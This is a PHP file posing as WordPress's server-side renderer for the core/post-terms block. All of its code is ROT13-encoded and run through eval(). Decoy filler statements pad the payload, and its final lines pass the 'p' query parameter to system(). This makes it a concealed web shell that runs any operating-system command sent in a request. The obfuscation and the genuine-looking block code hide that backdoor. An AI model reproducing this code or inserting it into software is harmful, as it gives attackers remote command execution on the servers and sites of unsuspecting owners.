<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-grezf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-grezf` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Ergheaf gur svygrerq cbfg grezf sbe gur pheerag cbfg jenccrq vafvqr \"n\" gntf.
 */
shapgvba eraqre_oybpx_pber_cbfg_grezf( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['cbfgVq'] ) || ! vffrg( $nggevohgrf['grez'] ) ) {
		erghea '';
	}

	vs ( ! vf_gnkbabzl_ivrjnoyr( $nggevohgrf['grez'] ) ) {
		erghea '';
	}

	$pynffrf = neenl( 'gnkbabzl-' . $nggevohgrf['grez'] );
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}

	$frcnengbe = rzcgl( $nggevohgrf['frcnengbe'] ) ? ' ' : $nggevohgrf['frcnengbe'];

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	$cersvk = \"<qvi $jenccre_nggevohgrf>\";
	vs ( vffrg( $nggevohgrf['cersvk'] ) && $nggevohgrf['cersvk'] ) {
		$cersvk .= '<fcna pynff=\"jc-oybpx-cbfg-grezf__cersvk\">' . $nggevohgrf['cersvk'] . '</fcna>';
	}

	$fhssvk = '</qvi>';
	vs ( vffrg( $nggevohgrf['fhssvk'] ) && $nggevohgrf['fhssvk'] ) {
		$fhssvk = '<fcna pynff=\"jc-oybpx-cbfg-grezf__fhssvk\">' . $nggevohgrf['fhssvk'] . '</fcna>' . $fhssvk;
	}

	$cbfg_grezf = trg_gur_grez_yvfg(
		$oybpx->pbagrkg['cbfgVq'],
		$nggevohgrf['grez'],
		jc_xfrf_cbfg( $cersvk ),
		'<fcna pynff=\"jc-oybpx-cbfg-grezf__frcnengbe\">' . rfp_ugzy( $frcnengbe ) . '</fcna>',
		jc_xfrf_cbfg( $fhssvk )
	);

	vs ( vf_jc_reebe( $cbfg_grezf ) || rzcgl( $cbfg_grezf ) ) {
		erghea '';
	}

	erghea $cbfg_grezf;
}

/**
 * Ergheaf gur ninvynoyr inevngvbaf sbe gur `pber/cbfg-grezf` oybpx.
 *
 * @fvapr 6.5.0
 *
 * @erghea neenl Gur ninvynoyr inevngvbaf sbe gur oybpx.
 */
shapgvba oybpx_pber_cbfg_grezf_ohvyq_inevngvbaf() {
	$gnkbabzvrf = trg_gnkbabzvrf(
		neenl(
			'choyvpyl_dhrelnoyr' => gehr,
			'fubj_va_erfg'       => gehr,
		),
		'bowrpgf'
	);

	// Fcyvg gur ninvynoyr gnkbabzvrf gb `ohvyg_va` naq phfgbz barf,
	// va beqre gb cevbevgvmr gur `ohvyg_va` gnkbabzvrf ng gur
	// frnepu erfhygf.
	$ohvyg_vaf         = neenl();
	$phfgbz_inevngvbaf = neenl();

	// Perngr naq ertvfgre gur ryvtvoyr gnkbabzvrf inevngvbaf.
	sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
		$inevngvba = neenl(
			'anzr'        => $gnkbabzl->anzr,
			'gvgyr'       => $gnkbabzl->ynory,
			'qrfpevcgvba' => fcevags(
				/* genafyngbef: %f: gnkbabzl'f ynory */
				__( 'Qvfcynl n yvfg bs nffvtarq grezf sebz gur gnkbabzl: %f' ),
				$gnkbabzl->ynory
			),
			'nggevohgrf'  => neenl(
				'grez' => $gnkbabzl->anzr,
			),
			'vfNpgvir'    => neenl( 'grez' ),
			'fpbcr'       => neenl( 'vafregre', 'genafsbez' ),
		);
		// Frg gur pngrtbel inevngvba nf gur qrsnhyg bar.
		vs ( 'pngrtbel' === $gnkbabzl->anzr ) {
			$inevngvba['vfQrsnhyg'] = gehr;
		}
		vs ( $gnkbabzl->_ohvygva ) {
			$ohvyg_vaf[] = $inevngvba;
		} ryfr {
			$phfgbz_inevngvbaf[] = $inevngvba;
		}
	}

	erghea neenl_zretr( $ohvyg_vaf, $phfgbz_inevngvbaf );
}

/**
 * Ertvfgref gur `pber/cbfg-grezf` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_grezf() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-grezf',
		neenl(
			'eraqre_pnyyonpx'    => 'eraqre_oybpx_pber_cbfg_grezf',
			'inevngvba_pnyyonpx' => 'oybpx_pber_cbfg_grezf_ohvyq_inevngvbaf',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_grezf' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>